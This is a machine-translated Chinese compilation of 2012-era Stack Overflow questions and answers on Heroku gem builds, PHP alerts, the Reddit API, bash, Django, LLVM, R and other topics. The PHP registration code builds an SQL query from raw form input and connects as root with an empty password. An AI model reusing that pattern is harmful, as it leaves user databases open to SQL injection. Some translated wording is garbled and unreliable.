我的 Rails 应用程序通过 localhost 在我的机器上运行良好，但是当我将它部署到 Heroku 时，我得到了以下错误列表：

```
2012-11-11T04:59:20+00:00 heroku[web.1]: Starting process with command `bundle exec thin start -R config.ru -e production -p 38941`
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/ffi-inline-0.0.4/lib/ffi/inline/builders/c.rb:114:in `shared_object'
2012-11-11T04:59:33+00:00 app[web.1]: /app/vendor/bundle/ruby/1.9.1/gems/ffi-inline-0.0.4/lib/ffi/inline/compilers/gcc.rb:29:in `compile': compile error: see logs at /tmp/.ffi-inline-18803/85aad7364f11885370e58c4391df70e29ef22bbe.log (CompilationError)
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/ffi-inline-0.0.4/lib/ffi/inline/builders.rb:87:in `instance_eval'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/ffi-inline-0.0.4/lib/ffi/inline/builders.rb:87:in `build'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/ffi-inline-0.0.4/lib/ffi/inline/inline.rb:39:in `inline'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/ffi-inline-0.0.4/lib/ffi/inline/inline.rb:54:in `singleton_inline'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/tesseract-ocr-0.1.5/lib/tesseract/c.rb:34:in `<module:C>'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/tesseract-ocr-0.1.5/lib/tesseract/c.rb:31:in `<module:Tesseract>'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/tesseract-ocr-0.1.5/lib/tesseract/c.rb:29:in `<top (required)>'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `block in require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.3/lib/active_support/dependencies.rb:236:in `load_dependency'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/tesseract-ocr-0.1.5/lib/tesseract/api.rb:26:in `<top (required)>'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/ffi-inline-0.0.4/lib/ffi/inline/builders.rb:90:in `block in build'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/tesseract-ocr-0.1.5/lib/tesseract-ocr.rb:35:in `<top (required)>'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/bundler-1.2.1/lib/bundler/runtime.rb:68:in `block (2 levels) in require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/bundler-1.2.1/lib/bundler/runtime.rb:66:in `each'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `block in require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.3/lib/active_support/dependencies.rb:236:in `load_dependency'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/bundler-1.2.1/lib/bundler/runtime.rb:68:in `require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/bundler-1.2.1/lib/bundler/runtime.rb:55:in `each'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/bundler-1.2.1/lib/bundler/runtime.rb:55:in `require'
2012-11-11T04:59:33+
00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/bundler-1.2.1/lib/bundler.rb:128:in `require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/config/application.rb:7:in `<top (required)>'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/config/environment.rb:2:in `require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/bundler-1.2.1/lib/bundler/runtime.rb:66:in `block in require'
2012-11-11T04:59:33+00:00 app[web.1]:   from config.ru:3:in `require'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/config/environment.rb:2:in `<top (required)>'
2012-11-11T04:59:33+00:00 app[web.1]:   from config.ru:3:in `block in <main>'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/rack-1.4.1/lib/rack/builder.rb:51:in `instance_eval'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/rack-1.4.1/lib/rack/builder.rb:51:in `initialize'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/thin-1.4.1/lib/thin/controllers/controller.rb:181:in `load_rackup_config'
2012-11-11T04:59:33+00:00 app[web.1]:   from config.ru:1:in `new'
2012-11-11T04:59:33+00:00 app[web.1]:   from config.ru:1:in `<main>'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/thin-1.4.1/bin/thin:6:in `<top (required)>'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/bin/thin:19:in `load'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/bin/thin:19:in `<main>'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/thin-1.4.1/lib/rack/adapter/loader.rb:33:in `eval'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/thin-1.4.1/lib/rack/adapter/loader.rb:33:in `load'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/thin-1.4.1/lib/thin/controllers/controller.rb:71:in `start'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/thin-1.4.1/lib/thin/runner.rb:185:in `run_command'
2012-11-11T04:59:33+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/thin-1.4.1/lib/thin/runner.rb:151:in `run!'
2012-11-11T04:59:34+00:00 heroku[web.1]: Process exited with status 1
2012-11-11T04:59:38+00:00 heroku[router]: Error H10 (App crashed) 
```

除了 Heroku 可能对我正在使用的[Ruby Tesseract gem](https://github.com/meh/ruby-tesseract-ocr)有一些问题之外，我似乎无法对此做出正面或反面。也许依赖关系有问题？

更新：

经过进一步搜索，事实证明[该问题与 Tesseract gem 有关](https://github.com/meh/ruby-tesseract-ocr/issues/3)。

根据支持票我需要设置这些路径......

```
ENV['CFLAGS'] = '-I/path/to/the/headers'
ENV['LDFLAGS'] = '-L/path/to/the/libs' 
```

...但我不知道如何设置它们，或者头文件/库的路径实际上应该在部署到 Heroku 的 Rails 应用程序上。有什么见解吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-20T00:07:33.450

以下是 Heroku 对我向他们提出的一张票的回复：

* * *

你好，

不幸的是，我们不支持在我们的堆栈中安装额外的库或二进制文件。最好的解决方法是将这些供应商到您的项目中。您需要使用 64 位 Linux 版本才能使它们在 Heroku 上运行；静态编译还可以帮助确保包含所需的任何依赖项。同样，对于依赖于外部库的 gem，我们建议静态编译 gem 并将其出售到您的项目中。

我们意识到这不是一项微不足道的任务，而且可能很难开始工作，我们希望在未来提供一种更简单的方法来做到这一点。不幸的是，我们没有关于何时可以使用此改进功能的 ETA。

如果您确实希望尝试提供您的二进制文件、库或 gem，您可以使用 Heroku 作为您的构建环境。我们的一位工程师创建了一个构建服务器，允许您上传源代码、运行编译步骤，然后下载生成的二进制文件。你可以在这里找到这个项目： [https ://github.com/heroku/vulcan](https://github.com/heroku/vulcan)

谢谢，Heroku 支持

* * *

换句话说，去其他地方部署。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T07:57:49.143

我也面临同样的问题，希望我们能互相帮助。

我找到[了一种在 Heroku 上设置 config var 的方法](https://devcenter.heroku.com/articles/config-vars)。根据 meh 在 github 上的评论，看起来它需要在 Heroku 上安装 Tesseract。也许你可以问 Heroku 的安装位置在哪里？

我还发现提到的[其他 gem可以成功集成到 Heroku。](https://github.com/dannnylo/tesseract_bin)不幸的是，它仍然使用 tesseract 2.04。

# javascript - 注册成功时的PHP HTML警告框

> ID：13328791
> 
> 赞同：0
> 
> 时间：2012-11-11T05:17:14.810
> 
> 标签：javascript, php, html

我有一个 html 注册表单和一个连接到数据库的 php 代码。现在如果注册成功并添加到数据库中，我如何通过弹出框提醒用户注册成功？

html代码只是一个简单的表单代码，所以这里是php代码：

```
<?php

if(isset($_POST['submit'])){
    $fname = $_POST['firstname'];
    $lname = $_POST['lastname'];
    $mname = $_POST['middlename'];
    $birthday = $_POST['year'] . '/' . $_POST['month'] . '/' . $_POST['day'];
    $sex = $_POST['sex'];
    $age = $_POST['age'];
    $address = $_POST['address'];
    $telephone = $_POST['telephone'];
    $occupation = $_POST['occupation'];
    $telephone = $_POST['telephone'];
    $cfname = $_POST['contactfirstname'];
    $clname = $_POST['contactlastname'];
    mysql_connect('localhost', 'root', '');
    mysql_select_db('HMIS');

    $query = "INSERT INTO `patientrecords` VALUES('','$lname','$fname','$mname','$birthday','$sex','$address','$telephone','$occupation','$clname','$cfname')";

    if(mysql_query($query)){
        echo "Registered";
    }else{
        echo "Error!". mysql_error();
    }
}

?> 
```

只有单击某个按钮时，我才能执行 javascript 警报框。但是在 php 代码中你不需要一个按钮.. 所以.. 你是怎么做的？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-11T05:24:32.860

试试这个，它应该工作

```
if(success)
{
   echo "<script type=\"text/javascript\">".
        "alert('success');".
        "</script>";
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-26T06:52:32.263

试试这个，它会帮助并重定向到另一个页面：

```
if($result){
    echo ("<SCRIPT LANGUAGE='JavaScript'>
    window.alert('Succesfully Registered')
    window.location.href='../index.php';
    </SCRIPT>");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T05:35:52.877

```
if(mysql_query($query)){
    $redirectUrl = 'YOUR URL';

    echo '<script type="application/javascript">alert("Registered"); window.location.href = "'.$redirectUrl.'";</script>';
}else{
    echo "Error!". mysql_error();
    //Remove Below comment if you want to also popup an alert on error
    /**echo '<script type="application/javascript">alert("Error! '.mysql_error().'");</script>';*/
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-22T20:55:37.373

试试这个，它会弹出一个窗口，显示您的成功消息，在您的表单页面中编辑谢谢。

```
<form method=post action="whatever.php" 
onsubmit="window.open('','my_form_target', 'width=300,height=200', true); 
this.target='my_form_target';"> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-11T05:24:12.973

您不能直接从 PHP 触发弹出窗口，因为它是一种服务器端语言。

但是，您可以回显包含 javascript 的 html 以显示弹出窗口，但这是一个非常老套的解决方案。

相反，您应该考虑利用 ajax 来完成类似的事情。

另外，正如@itachi 所说，不要使用 msql_* 而是使用 PDO，并确保绑定参数，因为不这样做可能会产生一些严重的安全隐患。

# python - Reddit API 返回无用的 JSON

> ID：13328798
> 
> 赞同：5
> 
> 时间：2012-11-11T05:18:14.130
> 
> 标签：python, urllib2, reddit

我正在尝试使用他们的 API 和 Python 的 urllib2 从 Reddit 抓取新故事，但我不断收到这样的 JSON 文档：

```
{ u'kind': u'Listing', u'data': { u'modhash': u'', u'children': [], u'after': None, u'before': None }} 
```

这是我的代码：

```
import json
import time
import urllib2

def get_submissions(after=None):
    url = 'http://reddit.com/r/all/new.json?limit=100'
    if after:
        url += '&after=%s' % after

    _user_agent = 'Reddit Link Analysis Bot by PirateLogic @ github.com/jamesbrewer'
    _request = urllib2.Request(url, headers={'User-agent': _user_agent})
    _json = json.loads(urllib2.urlopen(_request).read())   

    return [story for story in _json['data']['children']], _json['data']['after']

if __name__ == '__main__':
    after = None
    stories = []
    limit = 1
    while len(stories) < limit:
        new_stories, after = get_submissions(after)
        stories.extend(new_stories)
        time.sleep(2) # The Reddit API allows one request every two seconds.
        print '%d stories collected so far .. sleeping for two seconds.' % len(stories) 
```

我写的内容相当简短直接，但我显然忽略了一些东西，或者我对 API 或 urllib2 的工作原理没有完全了解。

这是来自 API的[示例页面。](http://www.reddit.com/r/all/new.json?limit=100)

这是怎么回事？

**编辑**尝试在另一个浏览器中加载示例页面后，我还看到了我在页面顶部发布的 JSON。不过，它似乎只适用于 //new.json 。如果我尝试//hot.json 或只是/.json，我会得到我想要的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T07:36:04.640

**编辑**：截至 2013 年 2 月 22 日，`new`不再需要将所需的排序`sort=new`添加为 URL 参数。这是因为在路由`rising`下不再提供排序`/new`，而是由`/rising`[ [source](http://www.reddit.com/r/changelog/comments/191ngp/reddit_change_rising_is_now_its_own_tab_instead/) ]提供。

* * *

URL [http://reddit.com/r/all/new.json?limit=100](http://reddit.com/r/all/new.json?limit=100)的问题在于`new`页面默认使用`rising`排序。如果您已登录，并且您已将默认排序更改为，`new`那么您真正看到的是页面[http://reddit.com/r/all/new.json?limit=100&sort=new](http://reddit.com/r/all/new.json?limit=100&sort=new)的结果。注意参数的添加`sort=new`。

因此结果是正确的，只是上升视图没有为/r/all 更新。

在相关说明中，如果您计划使用的不仅仅是 API 的单个部分，我强烈建议使用[PRAW （python reddit API 包装器）而不是编写自己的代码。](https://github.com/praw-dev/praw/wiki)这是您想要的相关代码：

```
import praw
r = praw.Reddit('YOUR DESCRIPTIVE USER AGENT NAME')
listing = list(r.get_subreddit('all').get_new_by_date())
print listing 
```

如果您只是想迭代提交，您可以省略该`list()`部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-03-08T23:06:52.650

有一段时间我被*类似*（与 OP 不同）的问题难住了——API`children`响应中没有。我想我会发布这个，以防其他人通过搜索引擎解决这个问题：

如果我在浏览器中打开此网址：

[https://www.reddit.com/comments.json?limit=100](https://www.reddit.com/comments.json?limit=100)

它似乎工作正常，但是当我发送请求时，它不会返回任何孩子。尝试使用请求的用户代理和类似的东西无济于事。最终改用`/r/all`评论流：

[https://www.reddit.com/r/all/comments.json?limit=100](https://www.reddit.com/r/all/comments.json?limit=100)

在浏览器中*和*通过编程请求可以正常工作。仍然不知道为什么第一个网址不起作用。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-11T07:20:35.363

[http://www.reddit.com/r/all.json?limit=100](http://www.reddit.com/r/all.json?limit=100)返回有意义的数据

[http://reddit.com/r/all/new?limit=100](http://reddit.com/r/all/new?limit=100)（没有.json）说没有项目......

看起来 reddit 没有使用 /new 你认为它是如何使用的，所以问题在于你对 api 的使用。

如果这个答案还不够，请包含指向 reddit api 文档的链接。

另外，这里有一个关于 REST 的快速说明。看起来 reddit 是 RESTful 的（我有待纠正，但这就是我在这里的实验告诉我的......）。这意味着通过在您尝试访问的任何 url 上删除 .json 扩展名，应该为您提供相同数据的人性化版本。这在测试期间可能很有用。只需使用浏览器查看内容，您就会看到 reddit 认为您要求的信息。

# regex - 将除一个以外的所有目录移动到另一个文件夹，如果它们存在，则将所有文件留在后面

> ID：13328799
> 
> 赞同：0
> 
> 时间：2012-11-11T05:18:27.227
> 
> 标签：regex, bash, if-statement, case, mv

我正在尝试将一些目录从一个位置移动到另一个位置，但我需要保留一个（所有文件都将保留在原位）。我已经尝试了几件事，但似乎没有任何效果。我已经测试了 DIR_COUNT 的值，它按预期工作。但是，当在条件语句或 case 语句中使用时，它不会按预期工作。

**有条件的**

```
#!/bin/bash
DIR_COUNT=$(find path/to/dir/*[^this_dir_stays_put] -type d -maxdepth 0 | wc -l)
echo $DIR_COUNT
if [[ $DIR_COUNT > 0 ]]
  then
    find path/to/dir/*[^this_dir_stays_put] -type d -maxdepth 0 -exec mv {} new/location \;
    echo "Moving dirs."
  else
    echo "No dirs to move."
fi 
```

**案子**

```
#!/bin/bash
DIR_COUNT=$(find path/to/dir/*[^this_dir_stays_put] -type d -maxdepth 0 | wc -l)
echo $DIR_COUNT
case $DIR_COUNT in
  0)
    echo "No dirs to move."
  *)
    echo "Moving dirs."
    find path/to/dir/*[^this_dir_stays_put] -type d -maxdepth 0 -exec mv {} new/location \;;;
esac 
```

使用这两个版本的代码，只要存在要移动的目录，一切都很好，但是如果没有要移动的目录，我就有问题了。

**有条件的**

```
$ sh script.sh
find: find path/to/dir/*[^this_dir_stays_put]: No such file or directory
0
No dirs to move. 
```

**案子**

```
$ sh script.sh
find: find path/to/dir/*[^this_dir_stays_put]: No such file or directory
0
Moving dirs.
find: find path/to/dir/*[^this_dir_stays_put]: No such file or directory 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T05:35:34.460

跳过条件和 case 语句。

```
find path/to/dir/*  \! -name 'this_dir_stays_put' -type d -maxdepth 0 \
   -exec mv {} new/location \; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T05:37:09.073

我假设你有这样的事情：

```
dir_a
dir_b
dir_c
dir_d
dir_e 
```

您想要移动除`dir_c`.

有时最简单的方法是将所有目录移动到新位置，然后将您想要的目录移回。不？

好的，如果你使用`Kornshell`它非常简单。如果使用`Bash`，则需要先设置如下`extglob`选项：

```
$ shopt -s extglob 
```

现在，您可以使用[扩展的通配语法](http://www.linuxjournal.com/content/bash-extended-globbing)来指定目录异常：

```
$ mv !(dir_c) $new_location 
```

匹配`!(dir_c)`除. `dir_c`这适用于 Kornshell。它适用于 BASH，但前提是您首先设置了`extglob`.

# django - django 重定向到查看

> ID：13328810
> 
> 赞同：29
> 
> 时间：2012-11-11T05:20:59.357
> 
> 标签：django, http, redirect

我有一个视图，我想在其中做一些事情，然后用成功消息重定向到另一个视图。我要重定向到的方法的签名是

```
quizView(request, quizNumber, errorMessage=None, successMessage=None): 
```

我尝试重定向到该视图如下所示：

```
return redirect(quizView, quizNumber=quizNumber, errorMessage=None, successMessage="Success!") 
```

我已经尝试了命名和未命名参数的大多数组合，但我无法让它做我想做的事。有没有办法使这项工作？

另外，我尝试只用第一个视图返回第二个视图，但是 URL 仍然是它在旧视图中的位置，而不是看起来好像它已经重定向了。

谢谢！

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-11-11T15:19:18.663

你没有给你的 URL 一个名字，所以你需要使用视图函数的整个路径。另外，该 URL 不接受`errorMessage`或`successMessage`参数，因此将它们放入`reverse`调用将失败。这就是你想要的：

```
return redirect('quizzes.views.quizView', quizNumber=quizNumber) 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-11T05:36:32.200

您可以尝试[https://docs.djangoproject.com/en/dev/topics/http/shortcuts/#redirect中给出的示例 2](https://docs.djangoproject.com/en/dev/topics/http/shortcuts/#redirect)

*   确保它在给定视图上执行“反向”操作。
*   您的视图名称应包含在单引号/

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2017-02-05T07:14:45.027

你应该参考这个[https://docs.djangoproject.com/en/1.11/topics/http/shortcuts/#redirect](https://docs.djangoproject.com/en/1.11/topics/http/shortcuts/#redirect)

用于重定向内部视图。您可以使用为视图创建 url 进行重定向，也可以在视图内调用，这非常容易。

# compiler-construction - 如何在 LLVM IR 中查找循环开始和结束

> ID：13328812
> 
> 赞同：4
> 
> 时间：2012-11-11T05:21:44.017
> 
> 标签：compiler-construction, llvm, clang

如何在 LLVM IR 中找到循环感应变量的起始值和结束值？

```
for(int i = start; i < end; i++) {
    A[i] = 0;
} 
```

想要替换为对“零（A，开始，结束）”的调用

还是使用 clang AST 做得更好？铿锵有设施做这种改变吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-20T03:00:11.220

您可能还想查看`SCEV`类的层次结构：http: [//llvm.org/docs/doxygen/html/classllvm_1_1SCEV.html](http://llvm.org/docs/doxygen/html/classllvm_1_1SCEV.html)

# facebook - 你能在一段时间内检索像 Facebook 历史记录这样的 url

> ID：13328817
> 
> 赞同：0
> 
> 时间：2012-11-11T05:23:25.203
> 
> 标签：facebook, twitter, statistics, linkedin, google-plus

我想知道是否有人想出一种方法来检索 Facebook 上的喜欢/分享历史，而不是简单的计数。我希望能够查询一段时间内的所有结果。例如，查询需要获取所有喜欢（以及喜欢的日期/时间）以及共享的相同内容。还可以*获取*喜欢/分享的用户的姓名或用户 ID，但这不是必需的。

Twitter、Google+ 和 LinkedIn 也是如此。

如果有人知道这样做的方法，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T17:30:52.703

对于 Google+，如果您还在您的网站上使用 Google Analytics，您可以使用 Google Analytics 的社交部分来了解您的社交指标，例如随着时间的推移 +1。Google Analytics 还支持 Facebook、LinkedIn 和其他服务的一些指标。

请参阅：[http ://www.google.com/analytics/features/social.html](http://www.google.com/analytics/features/social.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T06:25:08.053

我刚刚创建了一个收集与此类似的数据的工具，您想要的一些是可能的，而其他部分则不是。

Facebook 不提供任何从被赞对象的角度来跟踪何时发生赞的方法，除非您可以作为该对象进行身份验证并阅读私人通知。

许多对象，例如[PHOTOS](https://developers.facebook.com/docs/reference/api/photo/)，您可以通过点赞连接找出谁喜欢它们。

# macos - 如何从 xcode c 项目运行终端 shell 命令并从终端获取返回结果？

> ID：13328818
> 
> 赞同：0
> 
> 时间：2012-11-11T05:23:33.013
> 
> 标签：macos, terminal

我一直在做一个项目，想知道如何在 xcode 中发送终端命令并在弹出窗口中显示结果。我不想使用系统（）；方法，因为它打开终端。我知道可以使用 NSTasks，但我只是不知道如何使用它。谢谢大家！（顺便说一句，这是针对 macosx 而不是 ios）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T06:07:48.250

要获得 shell 命令的输出，您需要打开一个管道并从中读取数据。这是我用于此任务的内容：

```
static NSString *outputForShellCommand(NSString *command) {
    FILE *fp;
    char data[1024];

    NSMutableString *finalRet = [[NSMutableString alloc] init];
    fp = popen([command UTF8String], "r");

    if (fp == NULL) {
        [finalRet release];
        return nil;
    }
    while (fgets(data, 1024, fp) != NULL) {
        [finalRet appendString:[NSString stringWithUTF8String:data]];
    }
    if (pclose(fp) != 0) {
        [finalRet release];
        return nil;
    }

    return [NSString stringWithString:finalRet];
} 
```

另外，请注意，这个问题之前已经被[问过](https://stackoverflow.com/questions/646241/c-run-a-system-command-and-get-output) [很多](https://stackoverflow.com/questions/43116/how-can-i-run-an-external-program-from-c-and-parse-its-output) [次](https://stackoverflow.com/questions/125828/capturing-stdout-from-a-system-command-optimally) [了](http://ubuntuforums.org/showthread.php?t=285287)。

# java - 具有两个 GPU 的笔记本电脑上的硬件加速 BufferedImage

> ID：13328822
> 
> 赞同：3
> 
> 时间：2012-11-11T05:24:21.463
> 
> 标签：java, eclipse, gpu, hardware-acceleration

我对 Java 加速图形进行了大量研究，并确定我的 BufferedImages 或 VolatileImages 都没有被加速 - 事实上，我的笔记本电脑甚至不支持硬件加速，因为

```
GraphicsConfiguration.createCompatibleVolatileImage(width, height, new ImageCapabilities(true)); 
```

抛出一个异常告诉我。但是，我的笔记本电脑有一个 NVIDIA 650m，应该能够做到这一点。问题（或者我认为）是 Java 正在使用替代的 HP 集成图形芯片（默认情况下用于大多数非 GPU 密集型应用程序）。我如何告诉 Java 使用 NVIDIA 卡？我曾尝试通过 NVIDIA 控制面板强制 java.exe 和 javaw.exe 使用它，但无济于事。

我意识到这不是一个 java 问题，而是一个与我的特定硬件相关的问题，但我并不完全理解 java 和 Eclipse IDE 使用我的硬件的过程。我是否也可能需要在 Eclipse 中更改一些设置或命令行参数？即使您无法提供准确的答案，也非常感谢您提供一些正确方向的指示或我接下来应该研究的内容。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T09:57:36.223

你用过这个flag吗`-Dsun.java2d.opengl=true`

您使用哪个 Java 版本？

# wordpress - 自定义帖子类型创建 404？

> ID：13328825
> 
> 赞同：0
> 
> 时间：2012-11-11T05:25:05.467
> 
> 标签：wordpress, custom-post-type

我有一个名为“电影”的类别，所以我有，`site.com/movies/content-goes-here`但我不确定自定义帖子类型是否与类别冲突，或者某些事情没有正确完成。

这是自定义帖子类型：

```
 function movie_post_type() {
    register_post_type('movies', array(
    'labels' => array(
    'name' => 'Movie Posts',
    'singular_name' => 'Movie',
    'add_new' => 'Add New',
    'edit_item' => 'Edit ',
    'new_item' => 'New movie post',
    'view_item' => 'View movie post',
    'search_items' => 'Search movie posts',
    'not_found' => 'No movie posts found',
    'not_found_in_trash' => 'No movie posts found in Trash'
    ),
    'public' => true,

    'taxonomies' => array('category', 'post_tag')
    ));
    }

 add_action('init', 'movie_post_type'); 
```

我做错了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T05:50:02.197

不确定，但听起来您需要转到`Settings > Permalinks`并单击`Save Changes`以清除重写缓存。

# jquery - jquery tabletools 不起作用

> ID：13328834
> 
> 赞同：0
> 
> 时间：2012-11-11T05:27:32.747
> 
> 标签：jquery, websphere, jstl, datatables, tabletools

我正在尝试将 tabletools 插件用于我已经拥有的数据表。我在我的 jsp 页面中包含了 zeroclipboard.js 和 tabletools.min.js 文件。我在 WEB-INF 下创建了一个文件夹 swf，并在该目录中添加了 copy_cvs_xls_pdf.swf 文件。我在用

`<c:url var="copy_csv_xls_pdf" context="${renderRequest.contextPath }" value= "/swf/copy_csv_xls_pdf.swf" />`获取路径

我已将路径包含为

```
"oTableTools": {
   "sSwfPath": "<c:out value="${copy_csv_xls_pdf}" />"
} 
```

当我查看萤火虫时，我没有收到任何错误，但除了打印选项之外，所有选项仍然被禁用。任何帮助将不胜感激

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T07:52:38.750

直接使用EL表达式怎么样？

```
<c:set var="copy_csv_xls_pdf" value="/swf/copy_csv_xls_pdf.swf"/>

"sSwfPath": "${copy_csv_xls_pdf}" 
```

# r - 如何在R中计算nchar？

> ID：13328838
> 
> 赞同：0
> 
> 时间：2012-11-11T05:28:12.167
> 
> 标签：r, char

我尝试以下代码

```
j <- "*Politics:* Disgraced peer Jeffrey Archer is set to make \xa31m from his Belmarsh "
nchar(j)
# Error in nchar(j) : invalid multibyte string 1 
```

如您所见，我无法使用 nchar()。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-11T05:43:29.187

如果您知道特定的编码，您可以使用它`iconv`来转换为更好用的编码

```
j <- "*Politics:* Disgraced peer Jeffrey Archer is set to make \xa31m from his Belmarsh "
iconv(j, "ISO-8859-1", "UTF-8")
#[1] "*Politics:* Disgraced peer Jeffrey Archer is set to make £1m from his Belmarsh "
nchar(iconv(j, "ISO-8859-1", "UTF-8"))
#[1] 79 
```

我将您的文本写入文件并使用 geany 检查编码，这就是我到达 ISO-8859-1 的方式。

不需要您弄清楚编码的另一种方法是使用`type="bytes"`而不是手动转换为 UTF-8

```
nchar(j, type = "bytes")
#[1] 79 
```

我建议阅读 nchar 上的帮助文件，`?nchar`因为默认类型和 type="bytes" 之间存在细微差别。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T05:41:43.483

如果达森是对的...

我知道只有一种方法可以做到这一点，它需要读取每个字符串`readLines`：

```
x <- readLines(n=2)
*Politics:* Disgraced peer Jeffrey Archer is set to make \xa31m from his Belmarsh 
df vetf tefer\x vtgr
nchar(x) 
```

n=2 告诉 R 你正在阅读 2 行。然后阅读它们（我在 rgui中使用`contr`+或在 R studio 中使用 +）。然后你可以使用`r``cntrl``enter``nchar`

# opencv - 将图像乘以 -1

> ID：13328844
> 
> 赞同：3
> 
> 时间：2012-11-11T05:29:27.357
> 
> 标签：opencv, gradient

我正在 OpenCV 中开发一个主动轮廓算法，在其中一个步骤中我需要对梯度负值 -V[I(x,y)] ...我该如何执行此操作，我已经尝试过：

```
//load image (type CV_32FC3) and calculate gradient
neg = cv::Mat(gradient.cols,gradient.rows,CV_32FC3,cv::Scalar::all(-1));
gradient.mul(neg,1);
//to verify negatives value
double minVal, maxVal;
int maxIdx[3];
cv::minMaxIdx(gradient.reshape(1,0),&minVal,&maxVal,0,maxIdx);
std::cout << maxVal << " , " << minVal << std::endl; 
```

但是当我打印它时，我只能得到 10^-38 范围内的值。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T06:06:17.690

opencv::mul(gradient,neg,gradient,1) 是否给出相同的结果？

但可能是你需要梯度 = gradient.mul(neg)。我没有安装opencv，所以无法检查。

# c - 如何检查数据类型是否处于最大容量？

> ID：13328847
> 
